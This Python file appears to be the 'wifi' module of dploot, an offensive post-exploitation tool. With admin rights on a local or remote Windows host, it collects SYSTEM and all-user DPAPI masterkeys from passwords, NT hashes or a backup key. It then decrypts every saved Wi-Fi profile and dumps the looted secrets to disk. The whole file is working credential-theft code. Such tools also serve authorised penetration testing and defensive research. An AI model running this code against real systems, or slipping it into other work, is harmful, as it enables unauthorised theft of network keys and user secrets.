import argparse
import logging
from typing import Callable, Tuple

from dploot.action import DPLootAction
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.masterkeys import MasterkeysTriage
from dploot.triage.wifi import WifiTriage


NAME = "wifi"


class WifiAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage SYSTEM masterkeys\n")
                self.masterkeys = masterkeytriage.triage_system_masterkeys()
                # we need user masterkeys, too.
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys.extend(masterkeytriage.triage_masterkeys())
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def profile_callback(profile):
                if self.options.quiet:
                    profile.dump_quiet()
                else:
                    profile.dump()

            wifi_triage = WifiTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_profile_callback=profile_callback,
            )
            logging.info("Triage ALL WIFI profiles\n")
            wifi_triage.triage_wifi()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, wifi_triage.looted_files)

        else:
            logging.info("Not an admin, exiting...")

def entry(options: argparse.Namespace) -> None:
    a = WifiAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction, protocol: str) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump wifi profiles from local or remote target"
    )

    group = subparser.add_argument_group("wifi options")

    group.add_argument(
        "--mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    DPLootAction.add_general_args(subparser, protocol)

    return NAME, entry
